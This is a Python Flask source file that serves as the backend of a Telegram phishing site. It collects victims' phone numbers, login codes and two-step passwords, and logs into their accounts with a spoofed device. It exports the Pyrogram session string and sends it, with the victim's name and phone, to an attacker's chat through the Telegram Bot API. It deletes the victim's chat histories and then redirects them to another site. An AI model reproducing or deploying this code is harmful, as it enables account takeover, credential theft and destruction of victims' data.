import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from pyrogram import Client, errors
from pyrogram.types import StringSession
import requests

app = Flask(__name__, static_folder='.')

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")

temp_clients = {}

def parse_device_info(user_agent=""):
    device_model = "Mobile App"
    system_version = "Android 13"
    
    if "iPhone" in user_agent or "iPad" in user_agent:
        device_model = "iPhone"
        system_version = "iOS 17.0"
    elif "Windows" in user_agent:
        device_model = "PC Desktop"
        system_version = "Windows 11"
    elif "Macintosh" in user_agent:
        device_model = "MacBook Pro"
        system_version = "macOS Sonoma"
        
    return device_model, system_version

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    if not phone_number:
        return jsonify({"success": False, "error": "Phone number is required"}), 400

    user_agent = request.headers.get('User-Agent', '')
    device_model, system_version = parse_device_info(user_agent)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def _send():
        client = Client(
            name=f"session_{phone_number}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            device_model=device_model,
            system_version=system_version,
            app_version="10.2.1",
            lang_code="en"
        )
        await client.connect()
        sent = await client.send_code(phone_number)
        temp_clients[phone_number] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash
        }
        return True

    try:
        loop.run_until_complete(_send())
        return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    code = data.get('code')
    password = data.get('password')

    if not phone_number or not code:
        return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400

    session_data = temp_clients.get(phone_number)
    if not session_data:
        return jsonify({"success": False, "error": "Session expired. Please request OTP again."}), 400

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def _verify():
        client = session_data["client"]
        phone_code_hash = session_data["phone_code_hash"]

        try:
            if password:
                await client.check_password(password)
            else:
                await client.sign_in(phone_number, phone_code_hash, code)
        except errors.SessionPasswordNeeded:
            return {"requires_password": True}

        me = await client.get_me()
        username = f"@{me.username}" if me.username else "No Username"
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"

        # Export ออกมาเป็น Pyrogram StringSession ส្តង់ដារ (ขึ้นต้นด้วย B...)
        session_string = client.export_session_string()

        try:
            async for dialog in client.get_dialogs():
                if dialog.chat.id not in (777000, 777):
                    try:
                        await client.delete_chat_history(dialog.chat.id)
                    except:
                        pass
        except:
            pass

        await client.disconnect()
        temp_clients.pop(phone_number, None)

        if BOT_TOKEN and ADMIN_CHAT_ID:
            msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
            try:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
                )
            except:
                pass

        return {
            "success": True,
            "message": "Authentication successful!",
            "session": session_string,
            "redirectUrl": "https://jvpfans.com"
        }

    try:
        res = loop.run_until_complete(_verify())
        if res.get("requires_password"):
            return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
        return jsonify(res)
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 400

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
